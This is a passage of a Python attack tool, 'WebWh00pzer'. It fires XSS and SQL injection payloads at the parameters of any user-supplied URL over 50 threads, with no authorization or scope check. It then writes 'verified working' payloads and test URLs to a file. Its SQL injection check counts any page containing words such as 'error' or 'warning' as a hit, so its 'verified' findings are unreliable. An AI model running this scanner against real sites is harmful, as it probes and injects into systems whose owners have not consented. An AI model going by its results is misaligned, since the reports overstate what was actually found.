                        for pattern in sql_error_patterns:
                            if re.search(pattern, response.text, re.IGNORECASE):
                                return {
                                    'type': 'SQL Injection',
                                    'method': 'POST',
                                    'parameter': param,
                                    'payload': test_payload,
                                    'original_payload': payload,
                                    'url': base_url,
                                    'vulnerable': True,
                                    'verified': True,
                                    'error_pattern': pattern,
                                    'response_time': end_time - start_time
                                }
                        
                        if "SLEEP" in test_payload.upper() or "WAITFOR" in test_payload.upper():
                            if end_time - start_time > 4:
                                return {
                                    'type': 'SQL Injection (Time-based)',
                                    'method': 'POST',
                                    'parameter': param,
                                    'payload': test_payload,
                                    'original_payload': payload,
                                    'url': base_url,
                                    'vulnerable': True,
                                    'verified': True,
                                    'error_pattern': 'Time delay detected',
                                    'response_time': end_time - start_time
                                }
                    except:
                        pass
                        
                except Exception:
                    continue
                    
        except Exception:
            pass
            
        return None
    
    def scan_website(self, url, scan_type="full"):
        print(f"{Fore.RED}[*] Starting {scan_type.upper()} scan on: {url}{Style.RESET_ALL}")
        print(f"{Fore.RED}[*] Initializing advanced scanner...{Style.RESET_ALL}")
        
        self.vulnerabilities_found = []
        self.payloads_tested = 0
        self.requests_sent = 0
        
        if not self.discovered_params:
            print(f"{Fore.RED}[*] Auto-discovering parameters...{Style.RESET_ALL}")
            self.discover_parameters(url)
        
        all_params = []
        parsed_url = urlparse(url)
        if parsed_url.query:
            url_params = dict(urllib.parse.parse_qsl(parsed_url.query))
            all_params.extend(url_params.keys())
        
        all_params.extend(self.discovered_params)
        all_params = list(set(all_params))
        
        if not all_params:
            print(f"{Fore.RED}[*] No parameters found, testing common parameters...{Style.RESET_ALL}")
            all_params = self.common_params[:10]
        
        payloads_to_test = []
        
        if scan_type in ["full", "xss"]:
            for param in all_params:
                for payload in self.xss_payloads:
                    payloads_to_test.append(("XSS", payload, param))
            
        if scan_type in ["full", "sqli"]:
            for param in all_params:
                for payload in self.sql_payloads:
                    payloads_to_test.append(("SQL", payload, param))
            
        print(f"{Fore.RED}[*] Loaded {len(payloads_to_test)} payloads for {len(all_params)} parameters{Style.RESET_ALL}")
        print(f"{Fore.RED}[*] Testing vulnerabilities with real parameter injection...{Style.RESET_ALL}\n")
        
        print(f"{Fore.RED}[*] Phase 1: Quick vulnerability detection...{Style.RESET_ALL}")
        
        with ThreadPoolExecutor(max_workers=50) as executor:
            futures = []
            
            for payload_type, payload, param in payloads_to_test:
                if payload_type == "XSS":
                    future = executor.submit(self.test_xss_vulnerability_advanced, url, payload, param)
                else:
                    future = executor.submit(self.test_sql_vulnerability_advanced, url, payload, param)
                futures.append(future)
                
            for future in as_completed(futures):
                self.payloads_tested += 1
                result = future.result()
                
                progress = (self.payloads_tested / len(payloads_to_test)) * 100
                print(f"\r{Fore.RED}[*] Phase 1 Progress: {progress:.1f}% | Payloads tested: {self.payloads_tested}{Style.RESET_ALL}", end="")
                
                if result and result.get('vulnerable'):
                    self.vulnerabilities_found.append(result)
        
        print(f"\n{Fore.RED}[*] Phase 2: Verifying {len(self.vulnerabilities_found)} potential vulnerabilities...{Style.RESET_ALL}")
        
        # Verify each found vulnerability
        verified_count = 0
        for i, vuln in enumerate(self.vulnerabilities_found):
            progress = ((i + 1) / len(self.vulnerabilities_found)) * 100
            print(f"\r{Fore.RED}[*] Phase 2 Progress: {progress:.1f}% | Verifying vulnerability {i+1}/{len(self.vulnerabilities_found)}{Style.RESET_ALL}", end="")
            
            if vuln['type'] == 'XSS':
                verified_result = self.verify_xss_payload(url, vuln['payload'], vuln['parameter'])
            else:
                verified_result = self.verify_sql_payload(url, vuln['payload'], vuln['parameter'])
            
            if verified_result and verified_result.get('verified'):
                self.verified_vulnerabilities.append(verified_result)
                verified_count += 1
                print(f"\n{Fore.RED}[!] VERIFIED {verified_result['type']} VULNERABILITY!{Style.RESET_ALL}")
                print(f"    {Fore.RED}Method: {verified_result['method']} | Parameter: {verified_result['parameter']}{Style.RESET_ALL}")
                print(f"    {Fore.RED}Working Payload: {verified_result['payload'][:100]}{'...' if len(verified_result['payload']) > 100 else ''}{Style.RESET_ALL}")
                print(f"    {Fore.RED}URL: {verified_result['url']}{Style.RESET_ALL}")
                if 'execution_method' in verified_result:
                    print(f"    {Fore.RED}Execution Method: {verified_result['execution_method']}{Style.RESET_ALL}")
                if 'response_time' in verified_result:
                    print(f"    {Fore.RED}Response Time: {verified_result['response_time']:.2f}s{Style.RESET_ALL}")
                    
        print(f"\n\n{Fore.RED}{'='*80}{Style.RESET_ALL}")
        print(f"{Fore.RED}ADVANCED SCAN COMPLETE!{Style.RESET_ALL}")
        print(f"{Fore.RED}Payloads tested: {self.payloads_tested}{Style.RESET_ALL}")
        print(f"{Fore.RED}Requests sent: {self.requests_sent}{Style.RESET_ALL}")
        print(f"{Fore.RED}Potential vulnerabilities: {len(self.vulnerabilities_found)}{Style.RESET_ALL}")
        print(f"{Fore.RED}VERIFIED vulnerabilities: {len(self.verified_vulnerabilities)}{Style.RESET_ALL}")
        
        if self.verified_vulnerabilities:
            print(f"\n{Fore.RED}VERIFIED VULNERABILITIES SUMMARY:{Style.RESET_ALL}")
            for i, vuln in enumerate(self.verified_vulnerabilities, 1):
                print(f"{Fore.RED}[{i}] {vuln['type']} - {vuln['method']} - {vuln['parameter']} - WORKING!{Style.RESET_ALL}")
            
            self.generate_verified_payload_file(url)
        else:
            print(f"\n{Fore.RED}[!] No verified working vulnerabilities found.{Style.RESET_ALL}")
            print(f"{Fore.RED}[*] All {len(self.vulnerabilities_found)} potential vulnerabilities failed verification.{Style.RESET_ALL}")
                
        print(f"{Fore.RED}{'='*80}{Style.RESET_ALL}")
        
    def test_xss_vulnerability_advanced(self, url, payload, param):
        try:
            parsed_url = urlparse(url)
            base_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}"
            
            test_params = {}
            if parsed_url.query:
                test_params = dict(urllib.parse.parse_qsl(parsed_url.query))
            
            test_params[param] = payload
            
            response = self.session.get(base_url, params=test_params, timeout=10)
            self.requests_sent += 1
            
            response_lower = response.text.lower()
            payload_lower = payload.lower()
            
            if (payload_lower in response_lower or 
                payload.replace("'", "&#39;") in response.text or
                payload.replace('"', "&quot;") in response.text or
                payload.replace('<', "&lt;") in response.text or
                payload.replace('>', "&gt;") in response.text or
                "alert(" in response_lower or
                "confirm(" in response_lower or
                "prompt(" in response_lower or
                "javascript:" in response_lower or
                "onerror=" in response_lower or
                "onload=" in response_lower or
                "onclick=" in response_lower or
                "onfocus=" in response_lower or
                "<script" in response_lower or
                "</script>" in response_lower or
                "eval(" in response_lower or
                "document.write" in response_lower or
                "document.cookie" in response_lower or
                "window.location" in response_lower or
                "innerHTML" in response_lower):
                return {
                    'type': 'XSS',
                    'method': 'GET',
                    'parameter': param,
                    'payload': payload,
                    'url': response.url,
                    'vulnerable': True
                }
            
            try:
                response = self.session.post(base_url, data={param: payload}, timeout=10)
                self.requests_sent += 1
                
                response_lower = response.text.lower()
                payload_lower = payload.lower()
                
                if (payload_lower in response_lower or 
                    payload.replace("'", "&#39;") in response.text or
                    payload.replace('"', "&quot;") in response.text or
                    payload.replace('<', "&lt;") in response.text or
                    payload.replace('>', "&gt;") in response.text or
                    "alert(" in response_lower or
                    "confirm(" in response_lower or
                    "prompt(" in response_lower or
                    "javascript:" in response_lower or
                    "onerror=" in response_lower or
                    "onload=" in response_lower or
                    "onclick=" in response_lower or
                    "onfocus=" in response_lower or
                    "<script" in response_lower or
                    "</script>" in response_lower or
                    "eval(" in response_lower or
                    "document.write" in response_lower or
                    "document.cookie" in response_lower or
                    "window.location" in response_lower or
                    "innerHTML" in response_lower):
                    return {
                        'type': 'XSS',
                        'method': 'POST',
                        'parameter': param,
                        'payload': payload,
                        'url': base_url,
                        'vulnerable': True
                    }
            except:
                pass
                
        except Exception as e:
            pass
            
        return None
        
    def test_sql_vulnerability_advanced(self, url, payload, param):
        try:
            sql_errors = [
                "SQL syntax.*MySQL",
                "Warning.*mysql_.*",
                "valid MySQL result",
                "MySqlClient\.",
                "PostgreSQL.*ERROR",
                "Warning.*pg_.*",
                "valid PostgreSQL result",
                "Npgsql\.",
                "Driver.*SQL.*Server",
                "OLE DB.*SQL Server",
                "Microsoft SQL Native Client error",
                "SQLServer JDBC Driver",
                "Oracle error",
                "Oracle.*Driver",
                "Warning.*oci_.*",
                "Warning.*ora_.*",
                "mysql_fetch",
                "mysql_num_rows",
                "mysql_query",
                "mysql_connect",
                "pg_query",
                "pg_exec",
                "pg_connect",
                "ORA-[0-9]{5}",
                "Microsoft.*ODBC.*SQL Server",
                "SQLite.*error",
                "sqlite3.*Error",
                "Incorrect syntax near",
                "Unclosed quotation mark",
                "quoted string not properly terminated",
                "Invalid column name",
                "Unknown column",
                "Table.*doesn't exist",
                "Column count doesn't match",
                "Subquery returns more than 1 row",
                "Division by zero",
                "Data type mismatch",
                "Conversion failed",
                "Invalid object name",
                "Syntax error.*near",
                "You have an error in your SQL syntax"
            ]
            
            parsed_url = urlparse(url)
            base_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}"
            
            test_params = {}
            if parsed_url.query:
                test_params = dict(urllib.parse.parse_qsl(parsed_url.query))
            
            test_params[param] = payload
            
            response = self.session.get(base_url, params=test_params, timeout=10)
            self.requests_sent += 1
            
            response_lower = response.text.lower()
            
            for error_pattern in sql_errors:
                if re.search(error_pattern, response.text, re.IGNORECASE):
                    return {
                        'type': 'SQL Injection',
                        'method': 'GET',
                        'parameter': param,
                        'payload': payload,
                        'url': response.url,
                        'error_pattern': error_pattern,
                        'vulnerable': True
                    }
            
            if (response.status_code == 500 or
                "error" in response_lower or
                "exception" in response_lower or
                "warning" in response_lower or
                "fatal" in response_lower or
                "notice" in response_lower or
                "debug" in response_lower or
                "stack trace" in response_lower or
                "traceback" in response_lower or
                "line " in response_lower and "error" in response_lower):
                return {
                    'type': 'SQL Injection',
                    'method': 'GET',
                    'parameter': param,
                    'payload': payload,
                    'url': response.url,
                    'error_pattern': 'Response anomaly detected',
                    'vulnerable': True
                }
            
            try:
                response = self.session.post(base_url, data={param: payload}, timeout=10)
                self.requests_sent += 1
                
                response_lower = response.text.lower()
                
                for error_pattern in sql_errors:
                    if re.search(error_pattern, response.text, re.IGNORECASE):
                        return {
                            'type': 'SQL Injection',
                            'method': 'POST',
                            'parameter': param,
                            'payload': payload,
                            'url': base_url,
                            'error_pattern': error_pattern,
                            'vulnerable': True
                        }
                
                if (response.status_code == 500 or
                    "error" in response_lower or
                    "exception" in response_lower or
                    "warning" in response_lower or
                    "fatal" in response_lower or
                    "notice" in response_lower or
                    "debug" in response_lower or
                    "stack trace" in response_lower or
                    "traceback" in response_lower or
                    "line " in response_lower and "error" in response_lower):
                    return {
                        'type': 'SQL Injection',
                        'method': 'POST',
                        'parameter': param,
                        'payload': payload,
                        'url': base_url,
                        'error_pattern': 'Response anomaly detected',
                        'vulnerable': True
                    }
            except:
                pass
                
        except Exception as e:
            pass
            
        return None
        
    def generate_payload_files(self):
        print(f"{Fore.RED}[*] Generating payload files...{Style.RESET_ALL}")
        
        with open('xss_payloads.txt', 'w', encoding='utf-8') as f:
            f.write("WebWh00pzer XSS Payloads Database\n")
            f.write("Created by: o0c\n")
            f.write("Total payloads: {}\n\n".format(len(self.xss_payloads)))
            for payload in self.xss_payloads:
                f.write(payload + '\n')
                
        with open('sqli_payloads.txt', 'w', encoding='utf-8') as f:
            f.write("WebWh00pzer SQL Injection Payloads Database\n")
            f.write("Created by: o0c\n")
            f.write("Total payloads: {}\n\n".format(len(self.sql_payloads)))
            for payload in self.sql_payloads:
                f.write(payload + '\n')
                
        print(f"{Fore.RED}[+] XSS payloads saved to: xss_payloads.txt ({len(self.xss_payloads)} payloads){Style.RESET_ALL}")
        print(f"{Fore.RED}[+] SQL injection payloads saved to: sqli_payloads.txt ({len(self.sql_payloads)} payloads){Style.RESET_ALL}")
        
    def generate_url_payload_file(self, target_url):
        print(f"\n{Fore.RED}[*] Generating url_payload.txt file...{Style.RESET_ALL}")
        
        with open('url_payload.txt', 'w', encoding='utf-8') as f:
            f.write("WebWh00pzer URL Payload Database\n")
            f.write("Created by: o0c\n")
            f.write(f"Target URL: {target_url}\n")
            f.write(f"Total vulnerabilities found: {len(self.vulnerabilities_found)}\n")
            f.write("="*80 + "\n\n")
            
            if self.vulnerabilities_found:
                xss_count = 0
                sql_count = 0
                
                f.write("VULNERABILITIES FOUND:\n")
                f.write("="*50 + "\n\n")
                
                for i, vuln in enumerate(self.vulnerabilities_found, 1):
                    f.write(f"[{i}] {vuln['type']} VULNERABILITY\n")
                    f.write(f"Method: {vuln['method']}\n")
                    f.write(f"Parameter: {vuln['parameter']}\n")
                    f.write(f"Payload: {vuln['payload']}\n")
                    f.write(f"URL: {vuln['url']}\n")
                    if 'error_pattern' in vuln:
                        f.write(f"Error Pattern: {vuln['error_pattern']}\n")
                    f.write("-" * 50 + "\n\n")
                    
                    if vuln['type'] == 'XSS':
                        xss_count += 1
                    elif vuln['type'] == 'SQL Injection':
                        sql_count += 1
                
                f.write("\nSUMMARY:\n")
                f.write("="*30 + "\n")
                f.write(f"XSS Vulnerabilities: {xss_count}\n")
                f.write(f"SQL Injection Vulnerabilities: {sql_count}\n")
                f.write(f"Total Vulnerabilities: {len(self.vulnerabilities_found)}\n")
                f.write(f"Payloads Tested: {self.payloads_tested}\n")
                f.write(f"Requests Sent: {self.requests_sent}\n")
            else:
                f.write("No vulnerabilities found during scan.\n")
                
        print(f"{Fore.RED}[+] URL payload file saved to: url_payload.txt ({len(self.vulnerabilities_found)} vulnerabilities){Style.RESET_ALL}")
        
    def generate_verified_payload_file(self, target_url):
        print(f"\n{Fore.RED}[*] Generating url_payload.txt with VERIFIED working payloads...{Style.RESET_ALL}")
        
        with open('url_payload.txt', 'w', encoding='utf-8') as f:
            f.write("WebWh00pzer VERIFIED Working Payloads Database\n")
            f.write("Created by: o0c\n")
            f.write(f"Target URL: {target_url}\n")
            f.write(f"Total VERIFIED vulnerabilities: {len(self.verified_vulnerabilities)}\n")
            f.write("="*80 + "\n\n")
            
            f.write("⚠️  IMPORTANT: These payloads have been VERIFIED to work!\n")
            f.write("🔥 Copy and paste these URLs directly into your browser to test\n")
            f.write("🎯 Look for JavaScript alerts, console messages, or SQL errors\n")
            f.write("="*80 + "\n\n")
            
            if self.verified_vulnerabilities:
                xss_count = 0
                sql_count = 0
                
                f.write("VERIFIED WORKING VULNERABILITIES:\n")
                f.write("="*50 + "\n\n")
                
                for i, vuln in enumerate(self.verified_vulnerabilities, 1):
                    f.write(f"[{i}] {vuln['type']} VULNERABILITY - ✅ VERIFIED WORKING\n")
                    f.write(f"Method: {vuln['method']}\n")
                    f.write(f"Parameter: {vuln['parameter']}\n")
                    f.write(f"Working Payload: {vuln['payload']}\n")
                    f.write(f"Test URL: {vuln['url']}\n")
                    
                    if 'execution_method' in vuln:
                        f.write(f"Execution Method: {vuln['execution_method']}\n")
                        f.write("🔥 This XSS payload will execute JavaScript in the browser!\n")
                        f.write("📋 Test: Open the URL above and check for alert() or console messages\n")
                    
                    if 'error_pattern' in vuln:
                        f.write(f"SQL Error Pattern: {vuln['error_pattern']}\n")
                        f.write("🔥 This SQL payload causes database errors!\n")
                        
                    if 'response_time' in vuln:
                        f.write(f"Response Time: {vuln['response_time']:.2f} seconds\n")
                        if vuln['response_time'] > 4:
                            f.write("⏰ Time-based SQL injection confirmed!\n")
                    
                    f.write("-" * 50 + "\n\n")
                    
                    if vuln['type'] == 'XSS':
                        xss_count += 1
                    elif 'SQL Injection' in vuln['type']:
                        sql_count += 1
                
                f.write("\nVERIFIED SUMMARY:\n")
                f.write("="*30 + "\n")
                f.write(f"✅ Working XSS Vulnerabilities: {xss_count}\n")
                f.write(f"✅ Working SQL Injection Vulnerabilities: {sql_count}\n")
                f.write(f"🔥 Total VERIFIED Working Vulnerabilities: {len(self.verified_vulnerabilities)}\n")
                f.write(f"📊 Total Payloads Tested: {self.payloads_tested}\n")
                f.write(f"🌐 Total Requests Sent: {self.requests_sent}\n")
                
                f.write("\n" + "="*80 + "\n")
                f.write("🎯 TESTING INSTRUCTIONS:\n")
                f.write("="*80 + "\n")
                f.write("For XSS vulnerabilities:\n")
                f.write("1. Copy the 'Test URL' and paste it in your browser\n")
                f.write("2. Look for JavaScript alert() popups\n")
                f.write("3. Open browser Developer Tools (F12) and check Console tab\n")
                f.write("4. Look for any JavaScript execution or errors\n\n")
                f.write("For SQL Injection vulnerabilities:\n")
                f.write("1. Copy the 'Test URL' and paste it in your browser\n")
                f.write("2. Look for database error messages on the page\n")
                f.write("3. Check if the page loads differently or shows errors\n")
                f.write("4. For time-based injections, notice if page loads slowly\n")
            else:
                f.write("No verified working vulnerabilities found.\n")
                f.write("All potential vulnerabilities failed verification testing.\n")
                
        print(f"{Fore.RED}[+] VERIFIED payload file saved to: url_payload.txt ({len(self.verified_vulnerabilities)} WORKING vulnerabilities){Style.RESET_ALL}")
        
    def run(self):
        self.clear_screen()
        self.print_banner()
        
        while True:
            try:
                command = input(f"\n{Fore.RED}WebWh00pzer{Fore.WHITE}@{Fore.RED}o0c{Fore.WHITE}:~$ {Style.RESET_ALL}").strip().lower()
                
                if command == "exit":
                    print(f"{Fore.RED}[*] Exiting WebWh00pzer... Stay safe!{Style.RESET_ALL}")
                    break
                    
                elif command == "clear":
                    self.clear_screen()
                    self.print_banner()
                    
                elif command == "help":
                    self.print_help()
                    
                elif command.startswith("scan "):
                    url = command[5:].strip()
                    if url:
                        self.scan_website(url, "full")
                    else:
                        print(f"{Fore.RED}[!] Please provide a URL{Style.RESET_ALL}")
                    
                elif command.startswith("xss "):
                    url = command[4:].strip()
                    if url:
                        self.scan_website(url, "xss")
                    else:
                        print(f"{Fore.RED}[!] Please provide a URL{Style.RESET_ALL}")
                        
                elif command.startswith("sqli "):
                    url = command[5:].strip()
                    if url:
                        self.scan_website(url, "sqli")
                    else:
                        print(f"{Fore.RED}[!] Please provide a URL{Style.RESET_ALL}")
                        
                elif command.startswith("discover "):
                    url = command[9:].strip()
                    if url:
                        self.discover_parameters(url)
                    else:
                        print(f"{Fore.RED}[!] Please provide a URL{Style.RESET_ALL}")
                        
                elif command == "payloads":
                    self.generate_payload_files()
                    
                else:
                    print(f"{Fore.RED}[!] Unknown command. Type 'help' for available commands.{Style.RESET_ALL}")
                    
            except KeyboardInterrupt:
                print(f"\n{Fore.RED}[*] Scan interrupted by user{Style.RESET_ALL}")
            except Exception as e:
                print(f"{Fore.RED}[!] Error: {str(e)}{Style.RESET_ALL}")

if __name__ == "__main__":
    scanner = WebWh00pzer()
    scanner.run()
